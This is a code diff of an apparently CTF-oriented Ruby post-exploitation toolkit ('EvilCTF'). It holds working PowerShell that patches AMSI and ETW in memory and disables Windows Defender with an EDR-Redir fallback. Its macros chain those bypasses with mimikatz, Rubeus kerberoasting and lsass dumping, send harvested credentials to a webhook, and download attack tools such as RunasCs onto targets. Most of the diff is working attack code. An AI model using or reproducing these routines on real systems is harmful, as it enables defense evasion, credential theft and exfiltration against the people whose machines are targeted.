@@ -1,29 +1,9 @@
-    'runascs' => {
-      name: 'RunasCs',
-      filename: 'RunasCs.exe',
-      search_patterns: ['RunasCs.exe', 'RunasCs*.exe'],
-      description: 'C# RunAs implementation for user impersonation and UAC bypass',
-      url: 'https://github.com/antonioCoco/RunasCs',
-      download_url: 'https://github.com/antonioCoco/RunasCs/releases/latest/download/RunasCs.exe',
-      backup_urls: [],
-      zip: false,
-      recommended_remote: 'C:\\Users\\Public\\RunasCs.exe',
-      auto_execute: false,
-      category: 'privilege'
-    },
-module EvilCTF
-  module Tools
-    # Safely escape single quotes for PowerShell single-quoted strings
-    def self.ps_single_quote_escape(str)
-      str.to_s.gsub("'", "''")
-    end
-    # This file intentionally small: use files under lib/evil_ctf/tools/*
-  end
-end
 #!/usr/bin/env ruby
 # frozen_string_literal: true
-# Compatibility shim – define Fixnum for Ruby 3.x
-class Fixnum < Integer; end unless defined?(Fixnum)
+# Compatibility shim – define Fixnum for very old Rubies (pre-2.4)
+if RUBY_VERSION.to_f < 2.4
+  class Fixnum < Integer; end unless defined?(Fixnum)
+end
 require 'fileutils'
 require 'zip'
 require 'uri'
@@ -34,7 +14,6 @@ require 'digest/sha1'
 require 'readline'
 require 'shellwords'
 require 'evil_ctf/uploader'
-
 
 module EvilCTF::Tools
   TOOL_REGISTRY = {
@@ -237,52 +216,110 @@ module EvilCTF::Tools
   }.freeze
   # AMSI bypass script
   BYPASS_4MSI_PS = <<~PS
-    $kernel32 = @"
-    using System; using System.Runtime.InteropServices;
-    public class kernel32 {
-        [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
-        [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-        [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
+    try {
+      $kernel32 = 'using System; using System.Runtime.InteropServices; public class kernel32 { [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name); [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect); }'
+      Add-Type -TypeDefinition $kernel32 -ErrorAction SilentlyContinue
+
+      $amsiDll = [kernel32]::LoadLibrary("amsi.dll")
+      if ($amsiDll -eq [IntPtr]::Zero) {
+        "[!] AMSI bypass failed: amsi.dll not loaded"
+      } else {
+        $patch = [Byte[]] (0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0xC3)
+        $scanBuffer = [kernel32]::GetProcAddress($amsiDll, "AmsiScanBuffer")
+        if ($scanBuffer -ne [IntPtr]::Zero) {
+          $oldProtect = 0
+          [kernel32]::VirtualProtect($scanBuffer, [uint32]13, 0x40, [ref]$oldProtect) | Out-Null
+          [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $scanBuffer, 13)
+          "[+] AmsiScanBuffer patched"
+        } else {
+          "[!] AMSI bypass warning: AmsiScanBuffer not found"
+        }
+
+        # Fallback: also patch AmsiScanString (newer Windows builds)
+        $scanString = [kernel32]::GetProcAddress($amsiDll, "AmsiScanString")
+        if ($scanString -ne [IntPtr]::Zero) {
+          $oldProtectString = 0
+          [kernel32]::VirtualProtect($scanString, [uint32]13, 0x40, [ref]$oldProtectString) | Out-Null
+          [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $scanString, 13) | Out-Null
+          "[+] AmsiScanString patched as fallback"
+        }
+      }
+      "[+] AMSI bypass routine completed"
+    } catch {
+      "[!] AMSI bypass exception: $($_.Exception.Message)"
     }
-    "@
-    Add-Type $kernel32
-    $amsiDll = [kernel32]::LoadLibrary("amsi.dll")
-    $scanBuffer = [kernel32]::GetProcAddress($amsiDll, "AmsiScanBuffer")
-    $oldProtect = 0
-    [kernel32]::VirtualProtect($scanBuffer, [uint32]5, 0x40, [ref]$oldProtect) | Out-Null
-    $patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
-    [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $scanBuffer, 6)
-    "[+] AMSI bypassed (AmsiScanBuffer patched)"
-    try { IEX ("Am"+"siU"+"tils") } catch { "[+] Bypass confirmed" }
   PS
   # ETW bypass script
   ETW_BYPASS_PS = <<~PS
-    $kernel32 = @"
-    using System; using System.Runtime.InteropServices;
-    public class kernel32 {
-        [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
-        [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-        [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
-    }
-    "@
-    Add-Type $kernel32
-    $ntdll = [kernel32]::LoadLibrary("ntdll.dll")
-    $funcs = @("EtwEventWrite","EtwEventWriteTransfer","EtwEventWriteFull","EtwEventWriteEx")
-    $patch = [Byte[]] (0x48, 0x33, 0xC0, 0xC3)
-    foreach ($f in $funcs) {
-      $addr = [kernel32]::GetProcAddress($ntdll, $f)
-      if ($addr -ne 0) {
-        $old = 0
-        [kernel32]::VirtualProtect($addr, 4, 0x40, [ref]$old) | Out-Null
-        [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 4)
-      }
-    }
     try {
-      $type = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
-      $field = $type.GetField('etwProvider','NonPublic,Static')
-      $field.SetValue($null, [Activator]::CreateInstance("System.Diagnostics.Eventing.EventProvider", [Guid]::NewGuid()))
-    } catch {}
-    "[+] Full ETW bypass completed"
+      $kernel32 = 'using System; using System.Runtime.InteropServices; public class kernel32 { [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name); [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect); }'
+      Add-Type -TypeDefinition $kernel32 -ErrorAction SilentlyContinue
+
+      $ntdll = [kernel32]::LoadLibrary("ntdll.dll")
+      if ($ntdll -eq [IntPtr]::Zero) {
+        "[!] ETW bypass failed: ntdll.dll not loaded"
+      } else {
+        # Patch only the most stable ETW exports to reduce provider-host crashes.
+        $funcs = @("EtwEventWrite", "EtwEventWriteTransfer", "EtwEventWriteFull", "EtwEventWriteEx")
+        $patch = [Byte[]] (0x48, 0x33, 0xC0, 0xC3) # xor rax,rax ; ret
+        $patchLen = [uint32]$patch.Length
+        $patched = 0
+
+        foreach ($f in $funcs) {
+          $addr = [kernel32]::GetProcAddress($ntdll, $f)
+          if ($addr -ne [IntPtr]::Zero) {
+            $old = 0
+            [kernel32]::VirtualProtect($addr, $patchLen, 0x40, [ref]$old) | Out-Null
+            [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, $patch.Length)
+            $patched++
+          }
+        }
+        "[+] ETW patch-only bypass completed (patched funcs: $patched)"
+      }
+    } catch {
+      "[!] ETW bypass exception: $($_.Exception.Message)"
+    }
+  PS
+
+  # Windows version-aware bypass selector
+  BYPASS_DETECTION_PS = <<~PS
+    $osBuild = (Get-CimInstance Win32_OperatingSystem).BuildNumber
+    $arch = $env:PROCESSOR_ARCHITECTURE
+    $psVersion = $PSVersionTable.PSVersion.Major
+    "[+] OS Build: $osBuild | Arch: $arch | PS Version: $psVersion"
+    if ([int]$osBuild -lt 9600) {
+      "[+] Legacy Windows build detected - using conservative bypass mode"
+      "[+] Standard bypass will be used (BYPASS_4MSI_PS + ETW_BYPASS_PS)"
+    } elseif ([int]$osBuild -ge 22000) {
+      "[+] Windows 11/Server 2022+ detected - using enhanced bypass"
+      "[+] Enhanced AMSI/ETW routines enabled by default constants"
+    } else {
+      "[+] Windows 10/Server 2016/2019 detected - using standard bypass"
+      "[+] Standard bypass will be used (BYPASS_4MSI_PS + ETW_BYPASS_PS)"
+    }
+  PS
+
+  # Post-bypass verification script
+  BYPASS_VERIFICATION_PS = <<~PS
+    # Verify AMSI bypass
+    $amsiResult = 0
+    try {
+        $null = [Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils')
+        $amsiType = [Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils')
+        if ($amsiType) {
+            $amsiResult = $amsiType.GetMethod('ScanString', [Reflection.BindingFlags]'NonPublic, Static').Invoke($null, @('test', [Ref]([Int32]::MinValue)))
+            if ($amsiResult -eq 0x80070007) {
+                "[+] AMSI bypass verified (return code: 0x80070007)"
+            } else {
+          "[!] AMSI bypass failed (return code: 0x{0:x})" -f $amsiResult
+            }
+        }
+    } catch {
+        "[+] AMSI bypass status unknown (AmsiUtils not found)"
+    }
+    # ETW verification is informational in patch-only mode.
+    "[+] ETW bypass verification: patch-only mode enabled"
+    "[+] Bypass verification complete"
   PS
 
   def self.disable_defender(shell)
@@ -330,11 +367,11 @@ module EvilCTF::Tools
     }
   PS
 
-  result = shell.run(ps_cmd)
-  puts result.output
+  exec_res = EvilCTF::Execution.run(shell, ps_cmd, timeout: 60)
+  puts exec_res.output
 
   # Final check: is Defender still enabled?
-  final_status = shell.run('Get-MpComputerStatus | Select-Object -ExpandProperty RealTimeProtectionEnabled')
+  final_status = EvilCTF::Execution.run(shell, 'Get-MpComputerStatus | Select-Object -ExpandProperty RealTimeProtectionEnabled', timeout: 10)
   if final_status.output.strip == 'True'
     puts "[!] WARNING: Defender is still enabled after attempted disable."
     puts "[*] Attempting EDR-Redir V2 bypass..."
@@ -354,7 +391,7 @@ module EvilCTF::Tools
     ps_cmd = <<~PS
       try {
         New-Item -ItemType Directory -Path "C:\\TMP\\TEMPDIR" -Force | Out-Null
-        $result = Start-Process -FilePath "#{remote_edr_redir}" -ArgumentList "C:\\ProgramData\\Microsoft C:\\TMP\\TEMPDIR \"C:\\ProgramData\\Microsoft\\Windows Defender\"" -PassThru -Wait
+        $result = Start-Process -FilePath '#{EvilCTF::Utils.escape_ps_string(remote_edr_redir)}' -ArgumentList "C:\\ProgramData\\Microsoft C:\\TMP\\TEMPDIR \"C:\\ProgramData\\Microsoft\\Windows Defender\"" -PassThru -Wait
         if ($result.ExitCode -eq 0) {
           Write-Output "[+] EDR-Redir V2 executed successfully"
         } else {
@@ -398,7 +435,7 @@ end
       @macros = {
         'kerberoast' => [BYPASS_4MSI_PS, '& "C:\\Users\\Public\\Rubeus.exe" kerberoast /outfile:C:\\Users\\Public\\hashes.txt 2>$null'],
         'dump_creds' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, '& "C:\\Users\\Public\\mimikatz.exe" "privilege::debug" "sekurlsa::logonpasswords" exit 2>$null'],
-        'lsass_dump' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, '& "C:\\Users\\Public\\procdump64.exe" -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp 2>$null'],
+        'lsass_dump' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, '& "C:\\Users\\Public\\procdump64.exe" -accepteula -ma lsass.exe "C:\\Users\\Public\\lsass.dmp"'],
         'invoke-mimikatz' => [
           BYPASS_4MSI_PS,
           ETW_BYPASS_PS,
@@ -430,9 +467,9 @@ end
       puts "[*] Expanding macro: #{name}"
       macro.each do |step|
         begin
-          result = shell.run(step)
-          puts result.output.strip
-          matches = EvilCTF::Tools.grep_output(result.output)
+          exec_res = EvilCTF::Execution.run(shell, step, timeout: 120)
+          puts exec_res.output.to_s.strip
+          matches = EvilCTF::Tools.grep_output(exec_res.output)
           if matches.any?
             EvilCTF::Tools.save_loot(matches)
             EvilCTF::Tools.beacon_loot(webhook, matches) if webhook
@@ -462,7 +499,7 @@ end
         puts "[*] Attempting remote download on target for #{key}..."
         ps_cmd = <<~PS
           try {
-            (New-Object System.Net.WebClient).DownloadFile('#{tool[:download_url]}', '#{tool[:recommended_remote]}')
+            (New-Object System.Net.WebClient).DownloadFile('#{EvilCTF::Utils.escape_ps_string(tool[:download_url])}', '#{EvilCTF::Utils.escape_ps_string(tool[:recommended_remote])}')
             "SUCCESS"
           } catch {
             "ERROR: $($_.Exception.Message)"
@@ -528,7 +565,7 @@ end
     return success if success
     # Try PowerShell as last resort
     puts "[*] Trying PowerShell Invoke-WebRequest..."
-    ps_cmd = "powershell -Command \"try { Invoke-WebRequest -Uri '#{url}' -OutFile '#{path}' -UseBasicParsing } catch { exit 1 }\""
+    ps_cmd = "powershell -Command \"try { Invoke-WebRequest -Uri '#{EvilCTF::Utils.escape_ps_string(url)}' -OutFile '#{EvilCTF::Utils.escape_ps_string(path)}' -UseBasicParsing } catch { exit 1 }\""
     success = system(ps_cmd)
     success
   end
@@ -602,7 +639,7 @@ end
       if extracted_file
         remote_path = File.join(File.dirname(tool[:recommended_remote]), extracted_file)
         
-        check_cmd = "if (Test-Path '#{remote_path}') { 'EXISTS' } else { 'MISSING' }"
+        check_cmd = "if (Test-Path '#{EvilCTF::Utils.escape_ps_string(remote_path)}') { 'EXISTS' } else { 'MISSING' }"
         result = shell.run(check_cmd)
         if result.output.include?('EXISTS')
           puts "[+] #{tool[:name]} already staged at #{remote_path}"
@@ -659,8 +696,8 @@ end
       # Create PowerShell extraction script
       extract_ps = <<~PS
         try {
-          $zipPath = '#{ps_single_quote_escape(zip_remote_path)}'
-          $extractPath = '#{ps_single_quote_escape(File.dirname(tool[:recommended_remote]))}'
+          $zipPath = '#{EvilCTF::Utils.escape_ps_string(zip_remote_path)}'
+          $extractPath = '#{EvilCTF::Utils.escape_ps_string(File.dirname(tool[:recommended_remote]))}'
           
           Add-Type -AssemblyName System.IO.Compression.FileSystem
           [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $extractPath)
@@ -699,7 +736,7 @@ end
       puts "[*] Executing #{key} with args: #{args}"
       ps_cmd = <<~PS
         try {
-          $proc = Start-Process -FilePath "#{remote_path}" -ArgumentList "#{args}" -PassThru -WindowStyle Hidden
+          $proc = Start-Process -FilePath '#{EvilCTF::Utils.escape_ps_string(remote_path)}' -ArgumentList '#{EvilCTF::Utils.escape_ps_string(args)}' -PassThru -WindowStyle Hidden
           $proc.WaitForExit(60000) | Out-Null
           if ($proc.HasExited) {
             "Completed with exit code: $($proc.ExitCode)"
